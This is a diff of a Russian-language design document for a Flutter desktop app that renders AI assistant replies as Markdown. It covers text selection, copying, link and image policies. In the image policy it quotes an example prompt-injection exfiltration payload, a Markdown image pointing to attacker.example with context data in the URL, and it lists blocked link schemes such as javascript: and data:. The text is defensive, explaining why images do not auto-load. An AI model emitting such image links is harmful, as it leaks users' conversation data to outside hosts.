@@ -368,7 +368,7 @@ sequenceDiagram
 | Элемент | Отображение |
 |---|---|
 | тема | `GptMarkdownThemeData` из `FluentTheme` (типографика, `accentColor`, `resources`), без `Theme.of` Material |
-| заголовки, абзац, курсив, жирный, зачёркнутый, inline-код, цитата, таблица, черта | разметка пакета со стилями темы; inline-код — моноширинный шрифт на `resources.subtleFillColorSecondary` |
+| заголовки, абзац, курсив, жирный, зачёркнутый, inline-код, цитата, таблица, черта | разметка пакета со стилями темы; inline-код — моноширинный шрифт на `resources.cardBackgroundFillColorSecondary` |
 | списки задач | `checkboxBuilder` → Fluent `Checkbox` только для чтения (встроенный флажок без Material-предка падает, issue #154 пакета) |
 | блок кода | `codeBuilder` → `CodeLabCodeBlock`: подпись языка вне выделения (`SelectionContainer.disabled`), кнопка «Copy», подсветка (A4); встроенная подсветка пакета не используется — в тёмной теме Fluent она светлая |
 | ссылка | `inlineLinkBuilder` и `linkBuilder` по `url` из пакета (не по тексту, как `onLinkTap`); правила ниже |
@@ -376,16 +376,26 @@ sequenceDiagram
 | HTML | `html: false`: теги показываются текстом как написаны, `<img>` и `<a>` не становятся элементами |
 | формулы | только `\(…\)` и `\[…\]` (`val_latex_flutter`, без сети); `$` — обычный символ (`useDollarSignsForLatex: false`) |
 
-Выделение текста — `SelectionArea` вокруг строки ответа; ограничение пакета: при копировании
-через несколько блоков между ними нет перевода строки. Кнопка «Copy» блока кода кладёт в буфер
-исходный код без ограды. Запись в буфер — обычное действие пользователя на границе presentation
-(`platform-integration.md`, §29). «Копировать ответ» и выделение через несколько строк ленты не
-вводятся (change `add-desktop-markdown`, решение Q5).
+Выделение текста — `SelectableRegion` из `package:flutter/widgets.dart` с собственными
+`TextSelectionControls` без ручек и миксином `TextSelectionHandleControls`
+(`_NoHandleSelectionControls`; без миксина `contextMenuBuilder` не вызывается и показывается
+меню Material) вокруг строки ответа, а не `SelectionArea`: `SelectionArea` и его
+меню принадлежат Material, а кит без Material-предка (change `add-desktop-markdown`, D4, D8, D10).
+Копирование — Cmd/Ctrl+C; правый клик — своё меню Fluent «Copy» и «Select all» через
+`contextMenuBuilder` (решение пользователя 2026-11-11). Ответ не является остановкой Tab
+(`FocusNode(skipTraversal: true)`). Ограничение пакета: при копировании через несколько блоков
+между ними нет перевода строки. Кнопка «Copy» блока кода кладёт в буфер исходный код без ограды;
+номер блока в ключе `code-copy-<rowId>-<n>` даёт лёгкий сканер оград в `rendering/`, потому что
+builder пакета номера не получает (D4). Ответ с вложенностью цитат и списков глубже
+`kMaxMarkdownNestingDepth` пакету не передаётся и показывается моноширинным текстом: глубокая
+вложенность даёт Stack Overflow в сборке пакета (D14). Запись в буфер — обычное действие
+пользователя на границе presentation (`platform-integration.md`, §29). «Копировать ответ» и
+выделение через несколько строк ленты не вводятся (change `add-desktop-markdown`, решение Q5).
 
 Политика ссылок. Решение принимает app (`isOpenableLink` в `link_policy.dart`) и передаёт через
 `CodeLabMarkdownScope`. Активна ссылка `http` или `https` с непустым хостом либо `mailto` с
-адресом: подчёркнутый `accentColor`, полный адрес в подсказке (управляющие и bidi-символы
-экранированы). Клик сразу вызывает `onOpenLink` → `CodeLabShellCubit.openExternalLink` →
+адресом: подчёркнутый `accentColor`, полный адрес в подсказке (управляющие, bidi- и невидимые символы
+экранированы `escapeForDisplay`, change `add-desktop-markdown`, D5). Клик сразу вызывает `onOpenLink` → `CodeLabShellCubit.openExternalLink` →
 повторная проверка схемы → `ExternalLinkOpener.open` (`url_launcher`). Окна подтверждения нет —
 решение пользователя 2026-11-11 (прежняя редакция предлагала окно с «Открыть» и «Копировать»).
 Прочие схемы (`file:`, `javascript:`, `data:`, `vscode:`, `xmpp:`), protocol-relative адреса и
@@ -396,7 +406,8 @@ sequenceDiagram
 Политика изображений (VIEW-12, DSK-7). Изображение не загружается без явного действия
 пользователя: автозагрузка — канал утечки через prompt injection
 (`![](https://attacker.example/?d=<данные из контекста>)`). По умолчанию — заглушка «Image» с
-хостом и именем файла (пакет не передаёт `alt` в `imageBuilder`) и полным адресом в подсказке.
+хостом и именем файла (пакет не передаёт `alt` в `imageBuilder`; подпись тоже проходит
+`escapeForDisplay`) и полным адресом в подсказке.
 Кнопка «Show image» — только для `https` с хостом (`isLoadableImage`); после клика app
 загружает картинку через `ResizeImage(NetworkImage)`. Выбор хранится в `TranscriptViewCubit` по
 строке и адресу на время запуска.
